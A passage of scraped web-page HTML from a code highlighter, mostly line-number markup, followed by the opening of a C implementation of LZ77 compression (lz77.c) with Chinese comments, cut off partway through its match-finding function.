class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-93\">93</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-94\">94</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-95\">95</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-96\">96</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-97\">97</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-98\">98</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-99\">99</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-100\">100</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-101\">101</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-102\">102</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-103\">103</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-104\">104</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-105\">105</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-106\">106</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-107\">107</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-108\">108</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-109\">109</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-110\">110</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-111\">111</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-112\">112</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-113\">113</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-114\">114</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-115\">115</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-116\">116</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-117\">117</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-118\">118</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-119\">119</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-120\">120</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-121\">121</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-122\">122</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-123\">123</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-124\">124</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-125\">125</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-126\">126</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-127\">127</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-128\">128</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-129\">129</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-130\">130</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-131\">131</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-132\">132</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-133\">133</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-134\">134</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-135\">135</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-136\">136</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-137\">137</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-138\">138</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-139\">139</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-140\">140</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-141\">141</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-142\">142</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-143\">143</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-144\">144</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-145\">145</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-146\">146</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-147\">147</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-148\">148</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-149\">149</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-150\">150</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-151\">151</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-152\">152</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-153\">153</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-154\">154</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-155\">155</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-156\">156</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-157\">157</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-158\">158</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-159\">159</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-160\">160</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-161\">161</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-162\">162</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-163\">163</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-164\">164</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-165\">165</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-166\">166</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-167\">167</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-168\">168</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-169\">169</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-170\">170</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-171\">171</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-172\">172</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-173\">173</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-174\">174</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-175\">175</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-176\">176</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-177\">177</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-178\">178</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-179\">179</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-180\">180</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-181\">181</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-182\">182</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-183\">183</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-184\">184</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-185\">185</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-186\">186</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-187\">187</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-188\">188</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-189\">189</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-190\">190</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-191\">191</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-192\">192</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-193\">193</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-194\">194</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-195\">195</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-196\">196</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-197\">197</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-198\">198</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-199\">199</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-200\">200</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-201\">201</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-202\">202</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-203\">203</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-204\">204</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-205\">205</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-206\">206</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-207\">207</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-208\">208</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-209\">209</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-210\">210</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-211\">211</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-212\">212</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-213\">213</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-214\">214</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-215\">215</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-216\">216</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-217\">217</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-218\">218</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-219\">219</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-220\">220</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-221\">221</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-222\">222</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-223\">223</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-224\">224</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-225\">225</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-226\">226</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-227\">227</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-228\">228</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-229\">229</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-230\">230</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-231\">231</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-232\">232</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-233\">233</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-234\">234</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-235\">235</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-236\">236</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-237\">237</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-238\">238</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-239\">239</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-240\">240</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-241\">241</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-242\">242</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-243\">243</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-244\">244</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-245\">245</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-246\">246</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-247\">247</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-248\">248</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-249\">249</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-250\">250</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-251\">251</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-252\">252</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-253\">253</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-254\">254</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-255\">255</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-256\">256</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-257\">257</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-258\">258</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-259\">259</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-260\">260</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-261\">261</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-262\">262</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-263\">263</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-264\">264</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-265\">265</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-266\">266</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-267\">267</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-268\">268</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-269\">269</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-270\">270</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-271\">271</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-272\">272</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-273\">273</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-274\">274</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-275\">275</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-276\">276</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-277\">277</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-278\">278</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-279\">279</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-280\">280</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-281\">281</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-282\">282</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-283\">283</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-284\">284</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-285\">285</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-286\">286</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-287\">287</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-288\">288</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-289\">289</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-290\">290</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-291\">291</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-292\">292</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-293\">293</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-294\">294</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-295\">295</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-296\">296</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-297\">297</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-298\">298</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-299\">299</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-300\">300</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-301\">301</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-302\">302</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-303\">303</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-304\">304</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-305\">305</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-306\">306</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-307\">307</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-308\">308</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-309\">309</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-310\">310</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-311\">311</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-312\">312</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-313\">313</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-314\">314</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-315\">315</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-316\">316</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-317\">317</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-318\">318</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-319\">319</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-320\">320</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-321\">321</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-322\">322</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-323\">323</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-324\">324</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-325\">325</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-326\">326</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-327\">327</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-328\">328</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-329\">329</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623045dbd1b466646927-330\">330</div><div class=\"crayon-num\" data-line=\"crayon-5b623045dbd1b466646927-331\">331</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-1\"><span class=\"crayon-c\">/*lz77.c*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-2\"><span class=\"crayon-p\">#include &lt;netinet/in.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-3\"><span class=\"crayon-p\">#include &lt;stdlib.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-4\"><span class=\"crayon-p\">#include &lt;string.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-6\"><span class=\"crayon-p\">#include \"bit.h\"</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-7\"><span class=\"crayon-p\">#include \"compress.h\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-9\"><span class=\"crayon-c\">/*compare_win 确定前向缓冲区中与滑动窗口中匹配的最长短语*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-10\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">compare_win</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-11\"><span class=\"crayon-h\">                       </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">match</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">longest</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-14\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*初始化偏移量*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*如果没有找到匹配，准备在前向缓冲区中返回0和下一个字符*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">longest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-20\"><span class=\"crayon-h\">    